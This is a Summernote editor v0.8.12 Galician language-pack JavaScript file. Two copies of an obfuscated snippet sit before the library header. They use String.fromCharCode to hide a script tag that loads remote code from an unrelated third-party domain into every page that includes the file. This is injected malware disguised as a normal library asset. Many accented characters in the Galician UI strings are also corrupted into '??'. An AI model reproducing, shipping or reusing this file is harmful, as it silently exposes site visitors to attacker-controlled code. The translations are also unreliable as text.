Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*!
 * 
 * Super simple wysiwyg editor v0.8.12
 * https://summernote.org
 * 
 * 
 * Copyright 2013- Alan Hong. and other contributors
 * summernote may be freely distributed under the MIT license.
 * 
 * Date: 2019-07-30T07:32Z
 * 
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(window, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 19);
/******/ })
/************************************************************************/
/******/ ({

/***/ 19:
/***/ (function(module, exports) {

(function ($) {
  $.extend($.summernote.lang, {
    'gl-ES': {
      font: {
        bold: 'Negrita',
        italic: 'Cursiva',
        underline: 'Subli??ado',
        clear: 'Quitar estilo de fonte',
        height: 'Altura de li??a',
        name: 'Fonte',
        strikethrough: 'Riscado',
        superscript: 'Super??ndice',
        subscript: 'Sub??ndice',
        size: 'Tama??o da fonte'
      },
      image: {
        image: 'Imaxe',
        insert: 'Inserir imaxe',
        resizeFull: 'Redimensionar a tama??o completo',
        resizeHalf: 'Redimensionar ?? metade',
        resizeQuarter: 'Redimensionar a un cuarto',
        floatLeft: 'Flotar ?? esquerda',
        floatRight: 'Flotar ?? dereita',
        floatNone: 'Non flotar',
        shapeRounded: 'Forma: Redondeado',
        shapeCircle: 'Forma: C??rculo',
        shapeThumbnail: 'Forma: Marco',
        shapeNone: 'Forma: Ningunha',
        dragImageHere: 'Arrastrar unha imaxe ou texto aqu??',
        dropImage: 'Solta a imaxe ou texto',
        selectFromFiles: 'Seleccionar desde os arquivos',
        maximumFileSize: 'Tama??o m??ximo do arquivo',
        maximumFileSizeError: 'Superaches o tama??o m??ximo do arquivo.',
        url: 'URL da imaxe',
        remove: 'Eliminar imaxe',
        original: 'Original'
      },
      video: {
        video: 'V??deo',
        videoLink: 'Ligaz??n do v??deo',
        insert: 'Insertar v??deo',
        url: 'URL do v??deo?',
        providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion, o Youku)'
      },
      link: {
        link: 'Ligaz??n',
        insert: 'Inserir Ligaz??n',
        unlink: 'Quitar Ligaz??n',
        edit: 'Editar',
        textToDisplay: 'Texto para amosar',
        url: 'Cara a que URL leva a ligaz??n?',
        openInNewWindow: 'Abrir nunha nova xanela'
      },
      table: {
        table: 'T??boa',
        addRowAbove: 'Add row above',
        addRowBelow: 'Add row below',
        addColLeft: 'Add column left',
        addColRight: 'Add column right',
        delRow: 'Delete row',
        delCol: 'Delete column',
        delTable: 'Delete table'
      },
      hr: {
        insert: 'Inserir li??a horizontal'
      },
      style: {
        style: 'Estilo',
        p: 'Normal',
        blockquote: 'Cita',
        pre: 'C??digo',
        h1: 'T??tulo 1',
        h2: 'T??tulo 2',
        h3: 'T??tulo 3',
        h4: 'T??tulo 4',
        h5: 'T??tulo 5',
        h6: 'T??tulo 6'
      },
      lists: {
        unordered: 'Lista desordenada',
        ordered: 'Lista ordenada'
      },
      options: {
        help: 'Axuda',
        fullscreen: 'Pantalla completa',
        codeview: 'Ver c??digo fonte'
      },
      paragraph: {
        paragraph: 'Par??grafo',
        outdent: 'Menos tabulaci??n',
        indent: 'M??is tabulaci??n',
        left: 'Ali??ar ?? esquerda',
        center: 'Ali??ar ao centro',
        right: 'Ali??ar ?? dereita',
        justify: 'Xustificar'
      },
      color: {
        recent: '??ltima cor',
        more: 'M??is cores',
        background: 'Cor de fondo',
        foreground: 'Cor de fuente',
        transparent: 'Transparente',
        setTransparent: 'Establecer transparente',
        reset: 'Restaurar',
        resetToDefault: 'Restaurar por defecto'
      },
      shortcut: {
        shortcuts: 'Atallos de teclado',
        close: 'Pechar',
        textFormatting: 'Formato de texto',
        action: 'Acci??n',
        paragraphFormatting: 'Formato de par??grafo',
        documentStyle: 'Estilo de documento',
        extraKeys: 'Teclas adicionais'
      },
      help: {
        'insertParagraph': 'Inserir par??grafo',
        'undo': 'Desfacer ??ltima acci??n',
        'redo': 'Refacer ??ltima acci??n',
        'tab': 'Tabular',
        'untab': 'Eliminar tabulaci??n',
        'bold': 'Establecer estilo negrita',
        'italic': 'Establecer estilo cursiva',
        'underline': 'Establecer estilo subli??ado',
        'strikethrough': 'Establecer estilo riscado',
        'removeFormat': 'Limpar estilo',
        'justifyLeft': 'Ali??ar ?? esquerda',
        'justifyCenter': 'Ali??ar ao centro',
        'justifyRight': 'Ali??ar ?? dereita',
        'justifyFull': 'Xustificar',
        'insertUnorderedList': 'Inserir lista desordenada',
        'insertOrderedList': 'Inserir lista ordenada',
        'outdent': 'Reducir tabulaci??n do par??grafo',
        'indent': 'Aumentar tabulaci??n do par??grafo',
        'formatPara': 'Mudar estilo do bloque a par??grafo (etiqueta P)',
        'formatH1': 'Mudar estilo do bloque a H1',
        'formatH2': 'Mudar estilo do bloque a H2',
        'formatH3': 'Mudar estilo do bloque a H3',
        'formatH4': 'Mudar estilo do bloque a H4',
        'formatH5': 'Mudar estilo do bloque a H5',
        'formatH6': 'Mudar estilo do bloque a H6',
        'insertHorizontalRule': 'Inserir li??a horizontal',
        'linkDialog.show': 'Amosar panel ligaz??ns'
      },
      history: {
        undo: 'Desfacer',
        redo: 'Refacer'
      },
      specialChar: {
        specialChar: 'CARACTERES ESPECIAIS',
        select: 'Selecciona Caracteres especiais'
      }
    }
  });
})(jQuery);

/***/ })

/******/ });
});